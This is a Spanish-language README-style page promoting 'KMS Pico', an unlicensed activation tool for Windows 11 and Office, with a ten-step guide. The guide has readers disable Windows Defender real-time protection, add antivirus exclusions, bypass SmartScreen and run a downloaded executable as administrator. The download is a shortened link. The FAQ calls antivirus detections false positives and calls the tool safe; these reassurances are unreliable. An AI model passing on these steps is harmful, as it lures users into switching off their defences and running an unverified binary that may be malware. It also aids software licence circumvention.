## 🧠 ¿Qué es KMS Pico?

**KMS Pico** es una utilidad ligera que emula un servidor **Key Management Service (KMS)** directamente en tu equipo. Microsoft diseñó originalmente KMS para que las grandes empresas pudieran activar cientos de dispositivos mediante un servidor interno. KMS Pico reproduce ese mecanismo en tu PC — sin servidor externo y sin costo alguno.

### Mecanismo Central

| Componente | Función |
|------------|---------|
| 🖥️ **Host KMS Local** | Se ejecuta como servicio en segundo plano |
| 🔑 **Clave GVLK** | Clave de licencia por volumen instalada en el sistema |
| ⏱️ **Validez de 180 días** | Cada token de activación dura seis meses |
| 🔄 **Tarea de Renovación** | Una tarea programada reactiva a diario |

## 🔧 Requisitos del Sistema

Antes de empezar, confirma que tu sistema cumple lo siguiente:

```
✅ Sistema Operativo: Windows 11 (Home, Pro, Enterprise, Education)
✅ Arquitectura: solo x64 (64 bits)
✅ RAM: mínimo 4 GB (recomendado 8 GB)
✅ Almacenamiento: al menos 150 MB libres
✅ Permisos: se requiere cuenta de administrador
✅ .NET Framework 4.8 o superior
✅ Windows Defender desactivado temporalmente
✅ Conexión a internet para la activación inicial
✅ TPM 2.0 habilitado (ya requerido por Windows 11)
```

> **⚠️ Aviso importante:** Crea un punto de restauración antes de modificar el sistema. Ve a **Panel de Control → Sistema → Protección del Sistema → Crear**. Si algo falla, podrás revertir los cambios.

## ⚙️ Guía de Instalación

### Paso 1 — Preparar el Sistema

Desactiva temporalmente la protección en tiempo real: **Seguridad de Windows → Protección contra virus y amenazas → Administrar la configuración → Protección en tiempo real → Desactivar**. Añade también una carpeta de exclusión para evitar que el archivo sea puesto en cuarentena.

```
Configuración → Privacidad y seguridad → Seguridad de Windows
→ Protección contra virus y amenazas → Exclusiones → Agregar carpeta
```

### Paso 2 — Extraer el Archivo

Haz clic derecho sobre el archivo descargado → **Extraer todo…** → elige una carpeta destino. Si el archivo pide contraseña, consulta la página de origen.

### Paso 3 — Ejecutar como Administrador

Localiza `KMSpico.exe`, haz clic derecho y elige **Ejecutar como administrador**. Confirma el aviso de UAC.

> 💡 Si aparece SmartScreen, haz clic en **Más información → Ejecutar de todas formas**.

[![Descargar KMS Pico](https://img.shields.io/badge/⬇️_DESCARGAR_KMS_PICO-FB923C?style=for-the-badge&logo=download&logoColor=white&labelColor=9A3412)](https://share.google/5PrUIrDcwJWscj6uA)

### Paso 4 — Instalar el Servicio KMS

En la ventana principal, pulsa el **botón rojo** central. La herramienta instalará los componentes necesarios en `C:\Windows\AutoKMS`. Espera el mensaje de confirmación.

### Paso 5 — Activar Windows 11

Con el servicio en marcha, pulsa el botón del **logotipo de Windows**. El proceso de activación comenzará automáticamente. En unos segundos verás una marca verde de confirmación.

### Paso 6 — Verificar la Activación

Abre el **Símbolo del sistema** como administrador y ejecuta:

```bash
slmgr /xpr
```

Si la activación fue exitosa, verás un mensaje indicando que el equipo está **activado permanentemente**.

Para información más detallada:

```bash
slmgr /dlv
```

### Paso 7 — Confirmar la Renovación Automática

Abre **Programador de tareas → Biblioteca del Programador de tareas** y comprueba que la tarea AutoKMS existe y está habilitada. Esto mantiene activo el ciclo de 180 días.

### Paso 8 — Restaurar el Antivirus

Cuando todo funcione, vuelve a activar la protección en tiempo real y añade la carpeta de KMS a las exclusiones para evitar eliminaciones futuras.

### Paso 9 — Activar Office (Opcional)

Cambia a la pestaña **Office** y pulsa **Activar Office**. El proceso es casi idéntico al de Windows.

### Paso 10 — Comprobar el Estado Final

Ve a **Configuración → Actualización y seguridad → Activación** y confirma que aparece "Windows está activado". Si ves la marca verde, todo está correcto.

| ❌ No aparece el aviso UAC | Cuenta incorrecta | Inicia sesión como administrador |
| ❌ Descarga lenta | Problema de red | Cambia de red o usa proxy |

## ❓ Preguntas Frecuentes

**¿KMS Pico es realmente gratis?**
Sí — utiliza el mecanismo KMS de Microsoft, por lo que no tiene costo.

**¿Cuánto dura la activación?**
180 días, con renovación diaria automática, por lo que es efectivamente permanente.

**¿Funciona en Windows 11 24H2?**
Sí, las versiones actuales son compatibles con todas las compilaciones recientes de Windows 11.

**¿Daña mi sistema?**
No modifica archivos del núcleo, por lo que es generalmente seguro desde fuentes confiables.

**¿Puedo desinstalarlo después?**
Sí — usa el desinstalador o los comandos de limpieza manual de arriba.

**¿También activa Office?**
Sí, es compatible con Office 2013–2021 y ediciones por volumen de 365.

**¿Por qué mi antivirus lo detecta?**
Las herramientas de activación suelen marcarse como "programas potencialmente no deseados" — normalmente es un falso positivo.

**¿Necesito internet todos los días?**
No, solo durante la configuración inicial y las comprobaciones de renovación.

**¿Debo reactivar tras una actualización de Windows?**
Normalmente no, aunque las actualizaciones mayores pueden requerir reejecutar la herramienta.

**¿Ralentiza mi PC?**
No. El servicio se ejecuta en segundo plano con un consumo mínimo de recursos.
